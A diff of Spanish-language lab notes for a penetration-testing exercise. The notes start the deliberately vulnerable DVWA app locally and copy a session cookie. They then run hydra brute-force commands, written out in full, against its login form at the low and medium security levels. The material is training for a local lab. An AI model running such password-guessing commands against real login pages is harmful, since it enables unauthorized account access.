@@ -1,6 +1,9 @@
+++ Pentestlab
+--- https://github.com/eystsen/pentestlab
+
 ++ Terminal
 --- bash pentestlab.sh start dvwa 
---- Copy url generated
+--- Copiar url generada
 
 ++ Web Browser
 --- Pegar url y acceder
@@ -13,5 +16,11 @@
 ---- Copiar el PHPSESSID
 
 ++ Terminal
---- hydra -L <usuarios.txt> -P <contraseñas.txt> 
+--- hydra -L <usuarios.txt> -P <contraseñas.txt> 'http-get-form://127.8.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=<valor>; security=low:S=Welcome' -V
+
+++ Web Browser
+--- Security level = medium
+
+++ Terminal
+--- hydra -L <usuarios.txt> -P <contraseñas.txt> 'http-get-form://127.8.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=<valor>; security=medium:S=Welcome' -V
 
